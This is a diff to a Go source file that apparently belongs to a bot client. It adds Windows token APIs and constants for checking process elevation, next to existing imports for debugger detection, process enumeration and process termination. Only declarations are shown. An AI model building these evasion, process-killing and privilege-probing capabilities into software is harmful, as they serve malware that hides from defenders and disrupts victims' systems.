@@ -58,15 +58,18 @@ var (
 	advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
 	// win32 api
-	pfnCreateMutexW       = kernel32.NewProc("CreateMutexW")
-	pfnIsDebuggerPresent  = kernel32.NewProc("IsDebuggerPresent")
-	pfnTerminateProcess   = kernel32.NewProc("TerminateProcess")
-	pfnEnumProcesses      = psapi.NewProc("EnumProcesses")
-	pfnEnumProcessModules = psapi.NewProc("EnumProcessModules")
-	pfnGetModuleBaseNameW = psapi.NewProc("GetModuleBaseNameW")
-	pfnOpenProcess        = kernel32.NewProc("OpenProcess")
-	pfnCloseHandle        = kernel32.NewProc("CloseHandle")
-	pfnGetLastError       = kernel32.NewProc("GetLastError")
+	pfnCreateMutexW        = kernel32.NewProc("CreateMutexW")
+	pfnIsDebuggerPresent   = kernel32.NewProc("IsDebuggerPresent")
+	pfnTerminateProcess    = kernel32.NewProc("TerminateProcess")
+	pfnEnumProcesses       = psapi.NewProc("EnumProcesses")
+	pfnEnumProcessModules  = psapi.NewProc("EnumProcessModules")
+	pfnGetModuleBaseNameW  = psapi.NewProc("GetModuleBaseNameW")
+	pfnOpenProcess         = kernel32.NewProc("OpenProcess")
+	pfnCloseHandle         = kernel32.NewProc("CloseHandle")
+	pfnGetLastError        = kernel32.NewProc("GetLastError")
+	pfnGetTokenInformation = advapi32.NewProc("GetTokenInformation")
+	pfnOpenProcessToken    = advapi32.NewProc("OpenProcessToken")
+	pfnGetCurrentProcess   = kernel32.NewProc("GetCurrentProcess")
 
 	botcore = BotCore{
 		hosts:        []string{"127.0.0.1:8080"},
@@ -86,6 +89,8 @@ var (
 const PROCESS_QUERY_INFORMATION = 0x0400
 const PROCESS_VM_READ = 0x0010
 const PROCESS_TERMINATE = 0x0001
+const TOKEN_QUERY = 0x0008
+const TokenElevation = 20
 
 type BotState int
 
